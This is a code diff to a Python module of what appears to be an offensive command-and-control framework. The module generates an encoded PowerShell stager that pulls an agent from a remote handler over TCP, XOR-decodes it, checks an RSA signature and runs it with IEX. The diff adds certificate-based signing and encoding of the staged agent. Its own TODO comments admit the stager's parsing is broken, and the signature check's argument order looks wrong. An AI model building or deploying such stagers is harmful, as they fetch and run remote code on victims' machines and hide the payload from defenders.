@@ -2,16 +2,19 @@
 from helpers.log import *
 import helpers.strings as helps
 import helpers.encryption as encryption
+import helpers.tls
 from ..platform import Platform
 from helpers.modulebase import ModuleBase
 import os.path
+import base64
+
 
 DEBUG_MODULE = "PlatformPowershell"
 MAX_AGENT_LEN = 102400 # TODO: choose shorter value, when done writing agent => faster staging
+SIGNATURE_ALGO = "SHA512"
+SIGNATURE_LEN = 512
+STATIC_SIGN_STRING = "syssspy"
 
-# TODO: for STAGEAUTHENTICATION
-#SIGNATURE_ALGO = "SHA512"
-#TEST_PUBLICKEY_XML = "<RSAKeyValue><Modulus>w0rhv1bFdln+bHgBkGU7QbI2Hv47aG4ey6vSlD7NsgCuj1gBzEe3moNe6e/Ml1AGUFpMSPE/yFKrYgZvNf/6dBAvkR/twLvQW+I/yKcnpV1stv0/AiZvFP6kXpdPpNeEYQtt+Hn829UQsoTjOfOjcKgrNdtvENmb9oJMhZeFmjHrJ7JL/nIcvGRBaNCuIqnF2VqPzSgGA5zWrFqhCO2Tb4l4eouPtofYa/aocuMbYuw/zkBS+fju647c1ZaE6neJs7newZ/gNYPRx2vHFVLaFlPRSwUMipNifXyZ9o5CizLndym1WCm+YlQ6Bj/r8N/nPnR3x0MA4ePuL41NfTemWnLRa9vWJVoXHwXjaHQcw8G2J8j4oxMoU8Egy8PSYetXpFg6W657vX1PhDjNS5mfmbBV+8XJT5M+Plb1C8dnaHMWtcW7krMByIUH7oWEWliAtuctZdhc345/Z4DABmOPGe40roYZxi+L4xDIsZGjrS0zMHWdahh98Nd1PnnGKsS48nOXFhwpFivXsRcBqEDUHG0U2glFFb1hRGAzwvetDMxkjRVU2Dq3dRF51jGNRxQp7FXdL9DdAbWzK/ELnUXbZpnGlx1WdGHumGUTIQ+oC/J1imo7UwfCHK0M7lJTDPnbYV7jRbmsqfEqx5CvN2joNt2NdwYqram1KqMuVKYlxaM=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
 
 class PlatformPowershell(Platform, ModuleBase):
     """
@@ -36,19 +39,132 @@ class PlatformPowershell(Platform, ModuleBase):
                 'Value'         :   "TRUE",
                 'Options'       :   ("TRUE", "FALSE")
             },
-            'STAGEENCODINGKEY' : {
-                'Description'   :   'Ascii-based key to use for the encoded staged agent (will be generated automatically if not set when generating stage, required for generating agent)',
-                'Required'      :   False,
-                'Value'         :   None
-            },
             'STAGEAUTHENTICATION' : {
                 'Description'   :   'Should the stager verify the agent code before executing (RSA signature verification with certificate pinning)',
                 'Required'      :   True,
-                'Value'         :   "FALSE",
-                'Options'       :   ("FALSE") # TODO: Currently not implemented
+                'Value'         :   "TRUE",
+                'Options'       :   ("TRUE", "FALSE")
+            },
+            'STAGECERTIFICATEFILE' : {
+                'Description'   :   'File path of a PEM with both RSA key and certificate to sign and verify staged agent with (you can generate a selfsigned cert by using the script gencert.sh initially)',
+                'Required'      :   False,
+                'Value'         :   "./data/syssspy.pem"
             }
         }
         self.platformpath = os.path.abspath(os.path.dirname(__file__))
+        self.privatekey = None
+        self.fingerprint = None
+        self.certificate = None
+        self.publickeyxml = None
+
+    def setoption(self, name, value):
+        """
+        Sets option to value if possible.
+        If STAGECERTIFICATEFILE has been changed, check consistency of its value.
+        """
+
+        if name.upper() == "STAGECERTIFICATEFILE":
+            if not(self._validate_certificatefile("STAGECERTIFICATEFILE",value)):
+                return True # value found, but not set
+            else:
+                # reset all key/cert data, it might change now
+                self.privatekey = None
+                self.fingerprint = None
+                self.certificate = None
+                self.publickeyxml = None
+
+        return ModuleBase.setoption(self, name, value)
+
+    def _validate_certificatefile(self, name, filename):
+        """
+        validate the certificate file path for existance and if it can be loaded as certificate
+        """
+
+        if not os.path.isfile(filename):
+            print_error("{} at {} does not exist".format(name, os.path.realpath(filename)))
+            return False
+        elif not self._tryload_certificatefile(filename):
+            print_error("Could not load {}".format(name))
+            return False
+        else:
+            return True
+
+    def _tryload_certificatefile(self, filename):
+        """
+        try to load the certificate file
+        """
+
+        if helpers.tls.load_certificate(filename) and helpers.tls.load_privatekey(filename):
+            return True
+        else:
+            return False
+
+    def _sign_data(self, data):
+        """
+        sign the data with the already loaded private key
+        """
+        
+        if not self.privatekey:
+            return None
+        return helpers.tls.create_signature(self.privatekey, data)
+    
+    def _getfingerprint(self):
+        """
+        returns the fingerprint = sha512(rsasign(PrivateKey, STATIC_SIGN_STRING))
+        to verify the server certificat in the stager and to also do stage encoding
+        """
+        
+        sign = self._sign_data(STATIC_SIGN_STRING)
+        print_debug(DEBUG_MODULE, "signature length = {}".format(len(sign)))
+        return helpers.tls.sha512(sign)
+
+    def _getrsapublickeyxml(self):
+        if not self.certificate:
+            return None
+        else:
+            publicnumbers = self.certificate.get_pubkey().to_cryptography_key().public_numbers()
+            modulus = base64.b64encode(helpers.tls.int2bytes(publicnumbers.n)).decode()
+            exponent = base64.b64encode(helpers.tls.int2bytes(publicnumbers.e)).decode()
+            xml = '<RSAKeyValue><Modulus>{}</Modulus><Exponent>{}</Exponent></RSAKeyValue>'.format(modulus, exponent)
+            return xml
+
+    def _initkeycertificate(self):
+        """
+        load the private key and certificate from STAGECERTIFICATEFILE, calculate fingerprint and
+        publickeyxml with them
+        """
+
+        if self.privatekey and self.fingerprint and self.certificate and self.publickeyxml:
+            return # all set up
+
+        self.privatekey = helpers.tls.load_privatekey(self.options['STAGECERTIFICATEFILE']['Value'])
+        if not self.privatekey:
+            print_error("Failed to load privatekey, please check STAGECERTIFICATEFILE")
+            return
+        self.certificate = helpers.tls.load_certificate(self.options['STAGECERTIFICATEFILE']['Value'])
+        if not self.certificate:
+            print_error("Failed to load certificate, please check STAGECERTIFICATEFILE")
+            return
+        self.fingerprint = self._getfingerprint()
+        self.publickeyxml = self._getrsapublickeyxml()
+
+    def validate_options(self):
+        """
+        validate the options for the platform
+        Especially check validity of our STAGECERTIFICATEFILE if necessary
+        """
+
+        valid = ModuleBase.validate_options(self)
+
+        # do we need STAGECERTIFICATEFILE and is it valid?
+        if self.options['STAGED']['Value'] == "TRUE" and self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+            if not self.options['STAGECERTIFICATEFILE']['Value'] or self.options['STAGECERTIFICATEFILE']['Value'] == "":
+                print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or STAGEAUTHENTICATION")
+                valid = False
+            elif not self._validate_certificatefile("STAGECERTIFICATEFILE",self.options['STAGECERTIFICATEFILE']['Value']):
+                valid = False
+
+        return valid
 
     def isstaged(self):
         """
@@ -56,10 +172,6 @@ class PlatformPowershell(Platform, ModuleBase):
         """
 
         return (self.options['STAGED']['Value'] == "TRUE")
-    
-    def _generatestageencodingkey(self):
-        import string
-        return helps.random_string(length=32, charset=string.ascii_letters+string.digits)
 
     def getstager(self, handler):
         """
@@ -87,29 +199,37 @@ class PlatformPowershell(Platform, ModuleBase):
             stager += '$r=New-Object IO.StreamReader($c.GetStream());'
             stager += '$b=$r.Read($a,0,{});'.format(MAX_AGENT_LEN)
 
-            # for stage encoding, include key and decoding algorithm here
+            # include fingerprint only if needed for STAGEENCODING and/or STAGEAUTHENTICATION
+            if self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+                self._initkeycertificate()
+                stager += '$fp="{}";'.format(self.fingerprint)
+
+            # for stage encoding, include decoding algorithm here
             if self.options['STAGEENCODING']['Value'] == "TRUE":
-                # if not set, generate an encoding key first
-                if not self.options['STAGEENCODINGKEY']['Value']:
-                    self.options['STAGEENCODINGKEY']['Value'] = self._generatestageencodingkey()
-                key = self.options['STAGEENCODINGKEY']['Value']
-                stager += '$k="{}";'.format(key)
-                stager += '$a=$a|%{$_-bXor$k[$i++%$k.Length]};'
+                stager += '$i=0;$a=$a|%{$_-bXor$fp[$i++%$fp.Length]};'
 
             # for stage authentication, include fingerprint and verification code here
-            #if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
-                # $fingerprint=PUBLICKEYFP
-                # TODO: split data in code, publickey, signature
-                # $x=New-Object Security.Cryptography.RSACryptoServiceProvider(4096)
-                # $x.FromXmlString($pk);
-                # $x.VerifyData("staticvalue".ToCharArray(),"SHA512",$fingerprint)
-                # $x.VerifyData($data,"SHA512",$sig)
+            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+                self._initkeycertificate()
 
-                # TO CREATE SIGNATURE FOR TESTING:
-                # $pk=$x.ToXmlString(0)
-                # $sig=$x.SignData($a, "SHA512")
-            
-            stager += '$s=New-Object String($a,0,$b);'
+                # split data in publickey, signature, agentcode:
+                parsepos=0 # next position to parse the array to string
+                stager += '$pk=New-Object String($a,{},{});'.format(parsepos, len(self.publickeyxml))
+                parsepos += len(self.publickeyxml)
+                stager += '$sig=New-Object String($a,{},{});'.format(parsepos,SIGNATURE_LEN)
+                parsepos += SIGNATURE_LEN
+                stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos,parsepos)
+                # TODO: this does not work, somehow $s is rubbisch!!!!                
+
+                # verify the public key and signature
+                stager += '$x=New-Object Security.Cryptography.RSACryptoServiceProvider(4096);'
+                stager += '$x.FromXmlString($pk);'
+                stager += 'if(-Not $x.VerifyData("{}".ToCharArray(),"{}",$fp.ToCharArray())){{Write-Out 1}};'.format(SIGNATURE_ALGO, STATIC_SIGN_STRING) # check fingerprint of server cert # TODO: Exit(1)
+                stager += 'if(-Not $x.VerifyData($s.ToCharArray(),"{}",$sig.ToCharArray())){{Write-Out 2}};'.format(SIGNATURE_ALGO) # check signature of agent code # TODO: Exit(1)
+            else:
+                stager += '$s=New-Object String($a,0,$b);'
+
+            # finally execute the agent
             stager += 'IEX $s;'
             print_debug(DEBUG_MODULE, "stager = {}".format(stager))
             return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd
@@ -169,15 +289,28 @@ class PlatformPowershell(Platform, ModuleBase):
             print_error("No agent module for platform and transport found.")
             return None
 
-        # TODO: stage authentication
+        # ok, lets encode the agent
+        agent = agent.encode('utf-8')
 
-        # encode agent with STAGEENCODINGKEY if active
-        if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
-            if not self.options['STAGEENCODINGKEY']['Value']:
-                print_error("cannot encode agent, since STAGEENCODING is active but no STAGEENCODINGKEY set. Set STAGEENCODINGKEY according to the value in the stager or generate a new stager and thus a new key aswell.")
+        # TODO: stage authentication
+        if self.isstaged() and self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+            self._initkeycertificate()
+            if not self.publickeyxml:
+                print_error("Cannot sign agent, since STAGEAUTHENTICATION is active but creating the publickeyxml failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                 return None
             else:
-                agent = encryption.xor_encode(agent, self.options['STAGEENCODINGKEY']['Value'])
+                #print_error("STAGEAUTHENTICATION not implemented yet")
+                print_debug(DEBUG_MODULE, "publickey as xml = {}".format(self.publickeyxml))
+                agent = self.publickeyxml.encode('utf-8') + self._sign_data(agent) + agent
+
+        # encode agent with fingerprint as encodingkey if active
+        if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
+            self._initkeycertificate()
+            if not self.fingerprint:
+                print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
+                return None
+            else:
+                agent = encryption.xor_encode(agent, self.fingerprint)
 
         if len(agent) > MAX_AGENT_LEN and self.isstaged():
             print_error("agent is longer than stager buffer, staging will fail")
